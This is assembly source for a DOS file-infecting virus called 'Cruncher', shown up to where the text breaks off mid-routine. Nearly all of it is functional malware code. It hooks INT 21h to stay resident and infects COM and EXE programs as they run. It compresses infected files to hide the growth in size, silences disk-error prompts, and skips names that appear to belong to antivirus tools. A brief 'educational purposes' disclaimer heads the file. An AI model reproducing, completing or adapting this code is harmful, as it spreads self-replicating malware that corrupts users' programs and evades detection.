;-----------------------------------------------------------------------------
;  Cruncher VIRUS     version 2.0
;
;  Use MASM 4.0 to compile this source
;  (other assemblers will probably not produce the same result)
;
;  Disclaimer:
;  This file is only for educational purposes. The author takes no
;  responsibility for anything anyone does with this file. Do not
;  modify this file!
;-----------------------------------------------------------------------------
 

                .RADIX  16


_TEXT           segment

                assume  cs:_TEXT, ds:_TEXT


VERSION         equ     2
FILELEN         equ     last - first            ;length of virus
FILEPAR         equ     (FILELEN + 010F)/10     ;length of virus in paragraphs
STACKOFF        equ     1000                    ;Stack offset
BUFLEN          equ     18                      ;length of buffer


;---------------------------------------------------------------------------
;               data area for virus
;---------------------------------------------------------------------------

                org     00E0

oi21            dw      0, 0                    ;original interupt 21
orglen          dw      0, 0                    ;original size of file
oldlen          dw      0, 0                    ;size of file to be packed
newlen          dw      0, 0                    ;size of packed file
lm_par          dw      0                       ;size of load module (p)
workseg         dw      0                       ;work segment
topseg          dw      0                       ;top of work area
vorm            dw      0
savevorm        dw      0
reads           db      0



;-----------------------------------------------------------------------------
;               begin of virus, installation in memory
;-----------------------------------------------------------------------------

                org     0100

first:          call    next                    ;get IP
next:           pop     si
                sub     si,low 3                ;SI = begin virus
                mov     di,0100
                cld

                push    ax                      ;save registers
                push    ds
                push    es
                push    di
                push    si

                mov     ah,30                   ;DOS version >= 3.1?
                int     21
                xchg    ah,al
                cmp     ax,030A
                jb      not_install

                mov     ax,33E0                 ;already resident?
                int     21
                cmp     ah,0A5
                je      not_install

                mov     ax,es                   ;adjust memory-size
                dec     ax
                mov     ds,ax
                xor     bx,bx
                cmp     byte ptr [bx],5A
                jne     not_install
                mov     ax,[bx+3]
                sub     ax,FILEPAR
                jb      not_install
                mov     [bx+3],ax
                sub     word ptr ds:[bx+12],FILEPAR

                mov     es,[bx+12]              ;copy program to top
                push    cs
                pop     ds
                mov     cx,FILELEN
        rep     movsb

                push    es
                pop     ds

                mov     ax,3521                 ;get original int21 vector
                int     21
                mov     ds:[oi21],bx
                mov     ds:[oi21+2],es

                mov     dx,offset ni21          ;install new int21 handler
                mov     ax,2521
                int     21

not_install:    pop     si                      ;restore registers
                pop     di
                pop     es
                pop     ds
                pop     ax

                add     si,(offset buffer-100)
                cmp     byte ptr cs:[si],4Dh    ;COM or EXE ?
                je      entryE

entryC:         push    di                      ;restore COM file
                mov     cx,BUFLEN
        rep     movsb
                ret

entryE:         mov     bx,ds                   ;calculate CS
                add     bx,low 10
                mov     cx,bx
                add     bx,cs:[si+0E]
                cli                             ;restore SS and SP
                mov     ss,bx
                mov     sp,cs:[si+10]
                sti
                add     cx,cs:[si+16]
                push    cx                      ;push new CS on stack
                push    cs:[si+14]              ;push new IP on stack
                db      0CBh                    ;retf


;-----------------------------------------------------------------------------
;               interupt 24 handler
;-----------------------------------------------------------------------------

ni24:           mov     al,3                    ;to avoid 'Abort, Retry, ...'
                iret


;-----------------------------------------------------------------------------
;               interupt 21 handler
;-----------------------------------------------------------------------------

ni21:           pushf

                cmp     ax,33E0                 ;install-check ?
                jne     not_ic
                mov     ax,0A500+VERSION        ;return a signature
                popf
                iret

not_ic:         cmp     ax,33E1                 ;print message ?
                jne     not_mes
                push    ds
                push    cs
                pop     ds
                mov     dx,offset printme
                mov     ah,9
                int     21
                pop     ds
                popf
                iret

not_mes:        push    es                      ;save registers
                push    ds
                push    si
                push    di
                push    dx
                push    cx
                push    bx
                push    ax

                cmp     ax,4B00                 ;execute ?
                jne     no_infect

                call    infect

no_infect:      pop     ax                      ;restore registers
                pop     bx
                pop     cx
                pop     dx
                pop     di
                pop     si
                pop     ds
                pop     es
                popf

org21:          jmp     dword ptr cs:[oi21]     ;call to old int-handler


;-----------------------------------------------------------------------------
;               tries to infect the file
;-----------------------------------------------------------------------------

infect:         cld

                push    cs                      ;copy filename to CS:0000
                pop     es
                mov     si,dx
                xor     di,di
                mov     cx,0080
namemove:       lodsb
                cmp     al,0
                je      moved
                cmp     al,'a'
                jb      char_ok
                cmp     al,'z'
                ja      char_ok
                xor     al,20                   ;convert to upper case
char_ok:        stosb
                loop    namemove
return:         ret

moved:          stosb                           ;put last zero after filename
                lea     si,[di-5]
                push    cs
                pop     ds
                
                lodsw                           ;check extension .COM or .EXE
                cmp     ax,'E.'
                jne     not_exe
                lodsw
                cmp     ax,'EX'
                jmp     short check

not_exe:        cmp     ax,'C.'
                jne     return
                lodsw
                cmp     ax,'MO'
check:          jne     return

                push    ax                      ;save begin of extension
                std                             ;find begin of filename
                mov     cx,si
                inc     cx
searchbegin:    lodsb
                cmp     al,':'
                je      checkname
                cmp     al,'\'
                je      checkname
                loop    searchbegin
                dec     si

checkname:      pop     dx
                cld                             ;check filename
                lodsw
                lodsw
                mov     di,offset namesE
                mov     cl,12
                cmp     dx,'EX'
                je      zz
                mov     di,offset namesC
                mov     cl,3
zz:     repnz   scasw
                je      return

name_ok:        mov     ah,48                   ;get space for work segment
                mov     bx,0FFFF
                int     21
                and     bx,0F800
                mov     ah,48
                int     21
                jc      return

                push    ax                      ;save begin and end of segment
                add     ax,bx
                mov     word ptr [topseg],ax
                pop     ax
                add     ah,10
                mov     word ptr [workseg],ax
                mov     cl,0Bh
                shr     bx,cl
                sub     bl,2
                mov     byte ptr [reads],bl

                mov     ax,3300                 ;get ctrl-break flag
                int     21
                push    dx                      ;save flag on stack

                cwd                             ;clear the flag
                inc     ax
                push    ax
                int     21

                mov     ax,3524                 ;get int24 vector
                int     21
                push    es                      ;save vector on stack
                push    bx

                push    cs
                pop     ds

                mov     dx,offset ni24          ;install new int24 handler
                mov     ah,25
                push    ax
                int     21

                mov     ax,4300                 ;ask file-attributes
                cwd
                int     21
                push    cx                      ;save attributes on stack

                xor     cx,cx                   ;clear attributes
                mov     ax,4301
                push    ax
                int     21
                jc      return1v

                mov     ax,3D02                 ;open the file
                int     21
                jnc     opened
return1v:       jmp     return1

opened:         xchg    ax,bx                   ;save handle

                mov     ax,5700                 ;get file date & time
                int     21
                push    dx                      ;save date & time on stack
                push    cx

                xor     dx,dx
                mov     di,offset oldlen
                mov     word ptr [di],dx
                mov     word ptr [di+2],dx

                mov     cx,word ptr [workseg]   ;read complete file
lees:           push    cx
                mov     ds,cx
                mov     cx,8000
                mov     ah,3F
                int     21
                pop     cx
                cmp     ax,dx                   ;stop if no more bytes are read
                je      gelezen
                add     word ptr cs:[di],ax     ;count size of file
                adc     word ptr cs:[di+2],dx
                add     ch,8
                dec     byte ptr cs:[reads]     ;read more?
                jnz     lees
                cmp     ax,(8000-FILELEN)       ;file too big?
                je      close2

gelezen:        mov     ds,word ptr cs:[workseg]   ;DS:SI -> begin of file
                xor     si,si

                push    cs
                pop     es
                mov     di,offset buffer
                mov     cx,BUFLEN               ;copy begin of file to buffer
        rep     movsb

                xor     si,si
                push    ds
                pop     es

                cmp     word ptr [si],'ZM'      ;EXE or COM?
                je      is_EXE


is_COM:         call    check_com               ;check the file
                jc      close2

                mov     ah,3E                   ;close file
                int     21

                xor     di,di                   ;put JMP at begin of file
                mov     al,0E9
                stosb
                mov     ax,word ptr cs:[oldlen]
                sub     ax,low 3
                stosw

                call    addvirus                ;append virus after file

                push    cs
                pop     ds

                mov     ah,3C                   ;create new file
                xor     dx,dx
                mov     cx,20
                int     21
                jc      return1
                xchg    ax,bx
                
                call    do_com                  ;write packed file
close2:         jmp     close


is_EXE:         call    check_exe               ;check the file
                jc      close2

                mov     ah,3E                   ;close the file
                int     21

infect_exe:     call    getlen                  ;calculate new CS & IP
                mov     cx,0010
                div     cx
                sub     ax,word ptr [si+8]
                dec     ax
                add     dx,low 10

                mov     word ptr [si+16],ax     ;put CS in header
                mov     word ptr [si+0E],ax     ;put SS in header
                mov     word ptr [si+14],dx     ;put IP in header
                mov     word ptr [si+10],STACKOFF  ;put SP in header

                call    getlen                  ;put new length in header
                add     ax,FILELEN
                adc     dx,0
                call    calclen
                mov     word ptr [si+4],ax
                mov     word ptr [si+2],dx

                call    addvirus                ;append virus after file

                call    pre_patch               ;prepare file for compression
                jnc     patch_ok
                pop     cx
                pop     dx
                jmp     short do_close

patch_ok:       push    cs
                pop     ds

                mov     ah,3C                   ;create new file
                xor     dx,dx
                mov     cx,20
                int     21
                jc      return1
                xchg    ax,bx                
                
                call    do_exe                  ;write packed file

close:          pop     cx                      ;restore date & time
                pop     dx
                mov     ax,5701
                int     21

do_close:       mov     ah,3E                   ;close the file
                int     21

return1:        pop     ax                      ;restore attributes
                pop     cx
                cwd
                int     21

                pop     ax                      ;restore int24 vector
                pop     dx
                pop     ds
                int     21

                pop     ax                      ;restore ctrl-break flag
                pop     dx
                int     21

                mov     ax,word ptr cs:[workseg]  ;release work segment
                sub     ah,10
                mov     es,ax
                mov     ah,49
                int     21

                ret


;-----------------------------------------------------------------------------
;               add virus to file
;-----------------------------------------------------------------------------

addvirus:       push    ds
                push    si

                push    cs                      ;ES:DI -> end of file
                pop     ds
                call    gotoend
                mov     si,0100                 ;append virus
                mov     cx,FILELEN
        rep     movsb

                add     word ptr [oldlen],FILELEN   ;adjust size counters
                adc     word ptr [oldlen+2],0

                mov     ax,word ptr [oldlen]
                mov     dx,word ptr [oldlen+2]
                mov     word ptr [orglen],ax
                mov     word ptr [orglen+2],dx

                pop     si
                pop     ds
                ret

;-----------------------------------------------------------------------------
;               filenames to avoid
;-----------------------------------------------------------------------------

namesC          db      'CO', '  ', '  '
namesE          db      'SC', 'CL', 'VS', 'NE', 'HT', 'TB', 'VI', 'FI'
                db      'GI', 'RA', 'FE', 'MT', 'BR', 'IM', '  ', '  '
                db      '  ', '  '


;-----------------------------------------------------------------------------
;               calculate length for EXE header
;-----------------------------------------------------------------------------

calclen:        mov     cx,0200
                div     cx
                or      dx,dx
                jz      no_cor
                inc     ax
no_cor:         ret


;-----------------------------------------------------------------------------
;               get original length of program
;-----------------------------------------------------------------------------

getlen:         mov     ax,cs:[oldlen]
                mov     dx,cs:[oldlen+2]
                ret


;-----------------------------------------------------------------------------
;               goto position in file
;-----------------------------------------------------------------------------

gotoend:        call    getlen
goto:           call    div10
                add     ax,word ptr cs:[workseg]
                mov     es,ax
                mov     di,dx
                ret


;-----------------------------------------------------------------------------
;               check COM file
;-----------------------------------------------------------------------------

check_com:      cmp     word ptr [si+3],0FC3Bh  ;already packed?
                je      bad_com

                test    byte ptr [si],80        ;maybe a strange EXE?
                jz      bad_com

                call    getlen                  ;check length
                cmp     ah,0D0
                jae     bad_com
                cmp     ah,1
                jb      bad_com

                clc
                ret

bad_com:        stc
                ret


;-----------------------------------------------------------------------------
;               check EXE file
;-----------------------------------------------------------------------------

check_exe:      cmp     word ptr [si+23],06FC   ;already packed?
                je      bad_exe

                cmp     word ptr [si+18],40     ;is it a windows/OS2 EXE ?
                jb      not_win

                mov     ax,003C
                cwd
                call    goto

                mov     ax,word ptr es:[di]
                mov     dx,word ptr es:[di+2]
                call    goto
                
                cmp     byte ptr es:[di+1],'E'
                je      bad_exe

not_win:        call    getlen                  ;check for internal overlays
                call    calclen
                cmp     word ptr [si+4],ax
                jne     bad_exe
                cmp     word ptr [si+2],dx
                jne     bad_exe

                cmp     word ptr [si+0C],si     ;high memory allocation?
                je      bad_exe

                cmp     word ptr [si+1A],si     ;overlay nr. not zero?
                jne     bad_exe


                cmp     word ptr [si+8],0F80    ;check size of header
                ja      bad_exe
                cmp     word ptr [si+8],2
                jb      bad_exe

                clc
                ret

bad_exe:        stc
                ret


;---------------------------------------------------------------------
;               prepare file for compression
;---------------------------------------------------------------------

pre_patch:      mov     ax,word ptr [si+4]      ;calculate size in paragraphs
                mov     cx,5
                shl     ax,cl
                sub     ax,word ptr [si+8]
                mov     word ptr cs:[lm_par],ax

                mov     ax,word ptr cs:[orglen]       ;calculate end of file
                mov     dx,word ptr cs:[orglen+2]
                call    goto

                add     ax,word ptr [si+8]      ;file too big?
                add     ax,2
                cmp     ax,word ptr cs:[topseg]
                jb      not2big
                stc
                ret

not2big:        mov     ax,word ptr [si+8]      ;copy header after file
                push    di
                push    di
                push    si
                mov     cx,3
                shl     ax,cl
                mov     cx,ax
        rep     movsw
                mov     dx,di
                pop     si
                pop     di
                push    dx

                mov     cx,word ptr [si+6]      ;are there relocation items?
                jcxz    z5
                add     di,[si+18]
                add     si,[si+18]
                push    di
                push    si
                push    cx
                xor     ax,ax                   ;clear relloc. items
                shl     cx,1
        rep     stosw
                pop     cx
                pop     si
                pop     di
                mov     bp,-1
z1:             lodsw                           ;fill in relloc. items
                mov     dx,ax
                lodsw
                or      ax,ax
                js      errr
                cmp     ax,bp
                jne     z3
                mov     ax,dx
                sub     ax,bx
                test    ah,0C0
                jnp     z2
                or      ah,80
                jmp     short z4

z2:             mov     ax,[si-2]
z3:             stosw
                mov     bp,ax
                mov     ax,dx
z4:             mov     bx,dx
                stosw
                loop    z1

z5:             pop     dx
                pop     si

                mov     cx,di                   ;search end of relloc. table
                xor     ax,ax
z6:             cmp     di,dx
                jae     z7
                scasb
                jz      z6
                mov     cx,di
                jmp     short z6

z7:             sub     cx,si
                push    es
                pop     ds

                push    si                      ;calculate checksum
                push    cx
                xor     ax,ax
z8:             xor     ah,[si]
                inc     si
                loop    z8
                and     ah,0FE
                pop     cx
                pop     si
                add     [si+2],ax
                mov     ax,cx
                xor     dx,dx

                add     word ptr cs:[oldlen],ax         ;adjust size counters
                adc     word ptr cs:[oldlen+2],dx
                mov     ax,[si+8]
                mov     cx,4
                shl     ax,cl
                sub     word ptr cs:[oldlen],ax
                sbb     word ptr cs:[oldlen+2],dx

                clc
                ret

errr:           stc
                ret


;---------------------------------------------------------------------
;               write packed COM file
;---------------------------------------------------------------------

do_com:         mov     ah,40                   ;first part of decryptor
                mov     cx,25
                mov     dx,offset diet_strt
                int     21

                push    bx

                mov     ax,word ptr [workseg]   ;init. segments
                mov     ds,ax                
                sub     ah,10
                mov     es,ax

                mov     cl,1

                call    diet                    ;crunch!

                push    cs
                push    cs
                pop     ds
                pop     es

                mov     word ptr [diet_strt+23],bx       ;save values
                mov     word ptr [newlen],ax
                mov     word ptr [newlen+2],dx

                pop     bx

                call    patchC                  ;adjust values in decryptor

                mov     ah,40                   ;write rest of decryptor
                mov     cx,094
                mov     dx,offset diet_end1
                int     21

                mov     ah,40
                mov     cx,0F
                mov     dx,offset diet_end2
                int     21

                mov     ax,4200                 ;goto begin
                xor     cx,cx
                cwd
                int     21

                mov     ah,40                   ;write first part again
                mov     cx,25
                mov     dx,offset diet_strt
                int     21
                ret


;---------------------------------------------------------------------
;               write packed EXE file
;---------------------------------------------------------------------

do_exe:         mov     ah,40                   ;first part of decryptor
                mov     cx,5A
                mov     dx,offset exe_hdr
                int     21

                push    bx

                mov     ax,word ptr [workseg]   ;init. segments
                mov     ds,ax
                sub     ah,10
                mov     es,ax

                cmp     word ptr cs:[oldlen+2],0
                jl      vorm1
                jg      vorm0
                cmp     word ptr cs:[oldlen],0FC00
                jbe     vorm1

vorm0:          xor     ax,ax
                jmp     short v1

vorm1:          mov     ax,1

v1:             mov     word ptr cs:[savevorm],ax
                mov     cx,ax

                mov     ax,ds
                xor     si,si
                add     ax,word ptr [si+8]
                mov     ds,ax

                call    diet                    ;crunch!

                push    cs
                pop     ds
                mov     es,word ptr [workseg]

                mov     word ptr [exe_hdr+12],bx        ;save values
                mov     word ptr [newlen],ax
                mov     word ptr [newlen+2],dx

                pop     bx

                call    patchE                  ;adjust values in decryptor

                push    cs
                pop     es

                mov     cx,94                   ;write rest of decryptor
                cmp     word ptr [savevorm],0
                jne     v2
                mov     cx,0C0
v2:             mov     ah,40
                mov     dx,offset diet_end1
                int     21

                mov     ax,word ptr [vorm]
                cmp     al,2
                je      v4
                cmp     al,1
                je      v3

                mov     cx,35
                mov     dx,offset diet_end_e1
                jmp     short v5

v3:             mov     cx,3E
                mov     dx,offset diet_end_e2
                jmp     short v5

v4:             mov     cx,1Dh
                mov     dx,offset diet_end_e3

v5:             mov     ah,40
                int     21

                mov     ax,4200                 ;goto begin
                xor     cx,cx
                cwd
                int     21

                mov     ah,40                   ;write first part again
                mov     cx,5A
                mov     dx,offset exe_hdr
                int     21
                ret


;---------------------------------------------------------------------
;               adjust values in COM decryptor
;---------------------------------------------------------------------

patchC:         mov     ax,word ptr [newlen]
                add     ax,0C4
                shr     ax,1
                mov     word ptr [diet_strt+0F],ax
                shl     ax,1
                add     ax,123
                mov     word ptr [diet_strt+0C],ax
                add     ax,word ptr [oldlen]
                sub     ax,word ptr [newlen]
                add     ax,3DBh
                mov     word ptr [diet_strt+1],ax

                mov     ax,word ptr [oldlen]
                add     ax,456
                mov     word ptr [diet_strt+21],ax
                add     ax,4Dh
                neg     ax
                mov     word ptr [diet_end2+0Dh],ax
                ret


;---------------------------------------------------------------------
;               adjust values in EXE decryptor
;---------------------------------------------------------------------

patchE:         push    bx

                mov     ax,3A
                xor     dx,dx
                add     ax,word ptr [newlen]
                adc     dx,word ptr [newlen+2]
                call    div10
                add     ax,18
                mov     word ptr [exe_hdr+2E],ax
                push    dx

                call    getlen
                call    shift4
                add     ax,58
                mov     si,ax
                sub     ax,word ptr [exe_hdr+2E]
                mov     word ptr [exe_hdr+35],ax
                cmp     ax,10
                jnb     pe0
                mov     word ptr [exe_hdr+35],10
                mov     si,word ptr [exe_hdr+2E]
                add     si,ax

pe0:            mov     ax,word ptr [orglen]
                mov     dx,word ptr [orglen+2]
                call    shift4
                sub     ax,word ptr es:[0008]
                mov     word ptr [exe_hdr+58],ax

                neg     ax
                add     ax,si
                mov     cx,4
                shl     ax,cl
                pop     dx
                add     ax,dx
                sub     ax,107
                mov     word ptr [exe_hdr+56],ax

                cmp     word ptr es:[0006],0
                jz      pe2

                mov     ax,es:[0010]
                mov     cx,4
                shr     ax,cl
                add     ax,es:[000E]
                mov     dx,si
                add     dx,8
                cmp     ax,dx
                jbe     pe1
                mov     word ptr [vorm],0
                mov     ax,word ptr es:[000E]
                mov     word ptr [exe_hdr+0E],ax
                mov     ax,word ptr es:[0010]
                mov     word ptr [exe_hdr+10],ax
                jmp     short pe5

pe1:            mov     word ptr [vorm],1
                jmp     short pe4

pe2:            mov     word ptr [vorm],2

pe4:            mov     word ptr [exe_hdr+0E],si
                mov     word ptr [exe_hdr+10],0080
                mov     ax,word ptr es:[000E]
                mov     word ptr [diet_end_e2+26],ax
                mov     word ptr [diet_end_e3+05],ax
                mov     ax,word ptr es:[0010]
                mov     word ptr [diet_end_e2+2Bh],ax
                mov     word ptr [diet_end_e3+0A],ax

pe5:            mov     ax,094
                cmp     word ptr [savevorm],0
                jne     pe6
                mov     ax,0C0
pe6:            xchg    ax,dx

                mov     ax,word ptr [vorm]
                mov     bx,offset vormval
                xlat
                add     ax,dx
                add     ax,5A
                xor     dx,dx
                add     ax,word ptr [newlen]
                adc     dx,word ptr [newlen+2]

                push    ax
                push    dx

                push    ax
                push    dx

                push    ax
                add     ax,01FF
                adc     dx,0
                call    shift9
                mov     word ptr [exe_hdr+4],ax
                pop     ax
                and     ax,01FF
                mov     word ptr [exe_hdr+2],ax

                pop     dx
                pop     ax

                add     ax,-11
                adc     dx,-1
                call    shift4
                xchg    ax,dx

                mov     di,word ptr [lm_par]
                add     di,es:[000A]
                mov     ax,si
                add     ax,8
                cmp     ax,di
                ja      pe10
                mov     ax,di
pe10:           sub     ax,dx
                mov     word ptr [exe_hdr+0A],ax

                mov     word ptr [exe_hdr+0C],0FFFF
                cmp     word ptr es:[000C],0FFFF
                jz      pe12

                mov     di,word ptr [lm_par]
                add     di,es:[000C]
                mov     ax,si
                add     ax,8
                cmp     ax,di
                ja      pe11
                mov     ax,di
pe11:           sub     ax,dx
                mov     word ptr [exe_hdr+0C],ax

pe12:           mov     ax,word ptr es:[0014]
                mov     word ptr [diet_end_e1+31],ax
                mov     word ptr [diet_end_e2+3A],ax
                mov     word ptr [diet_end_e3+19],ax

                mov     ax,word ptr es:[0016]
                mov     word ptr [diet_end_e1+33],ax
                mov     word ptr [diet_end_e2+3C],ax
                mov     word ptr [diet_end_e3+1Bh],ax

                pop     dx
                pop     ax
                add     ax,-22
                adc     dx,-1
                call    div10
                mov     word ptr [exe_hdr+1E],ax
                mov     word ptr [exe_hdr+1C],dx

                mov     ax,word ptr [orglen]
                and     ax,000F
                add     ax,word ptr es:[0018]
                mov     word ptr [diet_end_e1+4],ax
                mov     word ptr [diet_end_e2+4],ax

                mov     ax,word ptr es:[0006]
                mov     word ptr [diet_end_e1+7],ax
                mov     word ptr [diet_end_e2+7],ax

                mov     ax,word ptr [newlen]
                mov     dx,word ptr [newlen+2]
                mov     word ptr [exe_hdr+20],ax
                mov     byte ptr [exe_hdr+22],dl

                mov     ax,word ptr es:[0008]
                mov     word ptr [exe_hdr+1A],ax

                pop     bx
                ret


;---------------------------------------------------------------------
;               shift DX,AX 4 bytes to right
;---------------------------------------------------------------------

div10:          mov     cx,10
                div     cx
                ret


;---------------------------------------------------------------------
;               shift DX,AX to right
;---------------------------------------------------------------------

shift9:         mov     cx,9
                jmp     short shiftlup

shift4:         mov     cx,4
shiftlup:       dec     cx
                jl      shiftend
                sar     dx,1
                rcr     ax,1
                jmp     short shiftlup
shiftend:       ret


;---------------------------------------------------------------------
;               data area
;---------------------------------------------------------------------

vormval         db      35, 3E, 1Dh
handle          db      0, 0
data_163        dw      0
save_stack      dw      0, 0
data_166        dw      0
data_167        dw      0
data_168        dw      0
data_169        dw      0
data_170        dw      0
data_171        dw      0
data_172        db      1


;---------------------------------------------------------------------
;               decryptors
;---------------------------------------------------------------------

exe_hdr         db      04Dh, 05Ah, 000h, 000h, 000h, 000h, 001h, 000h
                db      002h, 000h, 000h, 000h, 0FFh, 0FFh, 000h, 000h
                db      000h, 000h, 000h, 000h, 003h, 000h, 000h, 000h
                db      01Ch, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 0FCh, 006h, 01Eh, 00Eh, 08Ch
                db      0C8h, 001h, 006h, 038h, 001h, 0BAh, 000h, 000h
                db      003h, 0C2h, 08Bh, 0D8h, 005h, 000h, 000h, 08Eh
                db      0DBh, 08Eh, 0C0h, 033h, 0F6h, 033h, 0FFh, 0B9h
                db      008h, 000h, 0F3h, 0A5h, 04Bh, 048h, 04Ah, 079h
                db      0EEh, 08Eh, 0C3h, 08Eh, 0D8h, 0BEh, 04Ah, 000h
                db      0ADh, 08Bh, 0E8h, 0B2h, 010h, 0EAh, 000h, 000h
                db      000h, 000h

diet_strt       db      0BFh, 000h, 000h, 03Bh, 0FCh, 072h, 004h, 0B4h
                db      04Ch, 0CDh, 021h, 0BEh, 000h, 000h, 0B9h, 000h
                db      000h, 0FDh, 0F3h, 0A5h, 0FCh, 08Bh, 0F7h, 0BFh
                db      000h, 001h, 0ADh, 0ADh, 08Bh, 0E8h, 0B2h, 010h
                db      0E9h, 000h, 000h, 000h, 000h

diet_end1       db      0D1h, 0EDh, 0FEh, 0CAh, 075h, 005h, 0ADh, 08Bh
                db      0E8h, 0B2h, 010h, 0C3h, 0E8h, 0F1h, 0FFh, 0D0h
                db      0D7h, 0E8h, 0ECh, 0FFh, 072h, 014h, 0B6h, 002h
                db      0B1h, 003h, 0E8h, 0E3h, 0FFh, 072h, 009h, 0E8h
                db      0DEh, 0FFh, 0D0h, 0D7h, 0D0h, 0E6h, 0E2h, 0F2h
                db      02Ah, 0FEh, 0B6h, 002h, 0B1h, 004h, 0FEh, 0C6h
                db      0E8h, 0CDh, 0FFh, 072h, 010h, 0E2h, 0F7h, 0E8h
                db      0C6h, 0FFh, 073h, 00Dh, 0FEh, 0C6h, 0E8h, 0BFh
                db      0FFh, 073h, 002h, 0FEh, 0C6h, 08Ah, 0CEh, 0EBh
                db      02Ah, 0E8h, 0B4h, 0FFh, 072h, 010h, 0B1h, 003h
                db      0B6h, 000h, 0E8h, 0ABh, 0FFh, 0D0h, 0D6h, 0E2h
                db      0F9h, 080h, 0C6h, 009h, 0EBh, 0E7h, 0ACh, 08Ah
                db      0C8h, 083h, 0C1h, 011h, 0EBh, 00Dh, 0B1h, 003h
                db      0E8h, 095h, 0FFh, 0D0h, 0D7h, 0E2h, 0F9h, 0FEh
                db      0CFh, 0B1h, 002h, 026h, 08Ah, 001h, 0AAh, 0E2h
                db      0FAh, 0E8h, 084h, 0FFh, 073h, 003h, 0A4h, 0EBh
                db      0F8h, 0E8h, 07Ch, 0FFh, 0ACh, 0B7h, 0FFh, 08Ah
                db      0D8h, 072h, 081h, 0E8h, 072h, 0FFh, 072h, 0D6h
                db      03Ah, 0FBh, 075h, 0DDh, 0E8h, 069h, 0FFh, 073h
                db      027h, 0B1h, 004h, 057h, 0D3h, 0EFh, 08Ch, 0C0h
                db      003h, 0C7h, 080h, 0ECh, 002h, 08Eh, 0C0h, 05Fh
                db      081h, 0E7h, 00Fh, 000h, 081h, 0C7h, 000h, 020h
                db      056h, 0D3h, 0EEh, 08Ch, 0D8h, 003h, 0C6h, 08Eh
                db      0D8h, 05Eh, 081h, 0E6h, 00Fh, 000h, 0EBh, 0B9h


diet_end2       db      033h, 0EDh, 033h, 0FFh, 033h, 0F6h, 033h, 0D2h
                db      033h, 0DBh, 033h, 0C0h, 0E9h, 000h, 000h


diet_end_e1     db      05Dh, 00Eh, 01Fh, 0BEh, 000h, 000h, 0B9h, 000h
                db      000h, 0ADh, 00Bh, 0C0h, 078h, 009h, 003h, 0C5h
                db      08Eh, 0C0h, 0ADh, 08Bh, 0D8h, 0EBh, 006h, 0D1h
                db      0E0h, 0D1h, 0F8h, 003h, 0D8h, 026h, 001h, 02Fh
                db      0E2h, 0E7h, 007h, 01Fh, 033h, 0EDh, 033h, 0FFh
                db      033h, 0F6h, 033h, 0D2h, 033h, 0DBh, 033h, 0C0h
                db      0EAh, 000h, 000h, 000h, 000h

diet_end_e2     db      05Dh, 00Eh, 01Fh, 0BEh, 000h, 000h, 0B9h, 000h
                db      000h, 0ADh, 00Bh, 0C0h, 078h, 009h, 003h, 0C5h
                db      08Eh, 0C0h, 0ADh, 08Bh, 0D8h, 0EBh, 006h, 0D1h
                db      0E0h, 0D1h, 0F8h, 003h, 0D8h, 026h, 001h, 02Fh
                db      0E2h, 0E7h, 007h, 01Fh, 081h, 0C5h, 000h, 000h
                db      08Eh, 0D5h, 0BCh, 000h, 000h, 033h, 0EDh, 033h
                db      0FFh, 033h, 0F6h, 033h, 0D2h, 033h, 0DBh, 033h
                db      0C0h, 0EAh, 000h, 000h, 000h, 000h

diet_end_e3     db      05Dh, 007h, 01Fh, 081h, 0C5h, 000h, 000h, 08Eh
                db      0D5h, 0BCh, 000h, 000h, 033h, 0EDh, 033h, 0FFh
                db      033h, 0F6h, 033h, 0D2h, 033h, 0DBh, 033h, 0C0h
                db      0EAh, 000h, 000h, 000h, 000h


;---------------------------------------------------------------------
;               crunch routines (thanks to Sourcer)
;---------------------------------------------------------------------

diet            proc    near
                push    bp
                mov     bp,sp
                push    di
                push    si

                mov     word ptr cs:[handle],bx
                mov     cs:data_172,cl

                call    getlen
                mov     cs:data_167,ax
                mov     cs:data_166,dx

                cli
                mov     cs:[save_stack],ss
                mov     cs:[save_stack+2],sp
                mov     bx,es
                mov     ss,bx
                mov     sp,0FE00h
                sti
                cld
                push    dx
                push    ax
                call    sub_24
                xor     cx,cx
                mov     cs:data_169,cx
                mov     cs:data_170,cx
                mov     cs:data_163,cx
                mov     cs:data_171,0FFFFh
                xor     si,si
                cmp     byte ptr cs:data_172,0
                jne     loc_219
                mov     ax,ds
                sub     ax,200h
                mov     ds,ax
                mov     si,2000
loc_219:
                mov     di,0E000
                mov     cs:data_168,di
                add     di,2
                pop     ax
                pop     dx
                or      dx,dx
                mov     dx,10h
                jnz     loc_220
                or      ah,ah
                jnz     loc_220
                mov     dh,al
loc_220:
                call    sub_27
                cmp     ax,2
                ja      loc_223
                jz      loc_221
                stc
                call    sub_23
                mov     al,[si-1]
                stosb
                mov     cx,1
                jmp     loc_236
loc_221:
                clc
                call    sub_23
                clc
                call    sub_23
                mov     al,bl
                stosb
                cmp     bx,0FF00h
                pushf
                call    sub_23
                popf
                jc      loc_222
                mov     cx,2
                jmp     loc_236
loc_222:
                inc     bh
                mov     cl,5
                shl     bh,cl
                shl     bh,1
                call    sub_23
                shl     bh,1
                call    sub_23
                shl     bh,1
                call    sub_23
                mov     cx,2
                jmp     loc_236
loc_223:
                push    ax
                clc
                call    sub_23
                stc
                call    sub_23
                mov     al,bl
                stosb
                cmp     bh,0FEh
                jb      loc_224
                mov     cl,7
                shl     bh,cl
                shl     bh,1
                call    sub_23
                stc
                call    sub_23
                jmp     loc_228
loc_224:
                cmp     bh,0FCh
                jb      loc_225
                mov     cl,7
                shl     bh,cl
                shl     bh,1
                call    sub_23
                clc
                call    sub_23
                stc
                call    sub_23
                jmp     short loc_228
loc_225:
                cmp     bh,0F8h
                jb      loc_226
                mov     cl,6
                shl     bh,cl
                shl     bh,1
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                shl     bh,1
                call    sub_23
                stc
                call    sub_23
                jmp     short loc_228
loc_226:
                cmp     bh,0F0h
                jb      loc_227
                mov     cl,5
                shl     bh,cl
                shl     bh,1
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                shl     bh,1
                call    sub_23
                clc
                call    sub_23
                shl     bh,1
                call    sub_23
                stc
                call    sub_23
                jmp     short loc_228
loc_227:
                mov     cl,4
                shl     bh,cl
                shl     bh,1
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                shl     bh,1
                call    sub_23
                clc
                call    sub_23
                shl     bh,1
                call    sub_23
                clc
                call    sub_23
                shl     bh,1
                call    sub_23
loc_228:
                pop     cx
                cmp     cx,3
                jne     loc_229
                stc
                call    sub_23
                jmp     loc_236
loc_229:
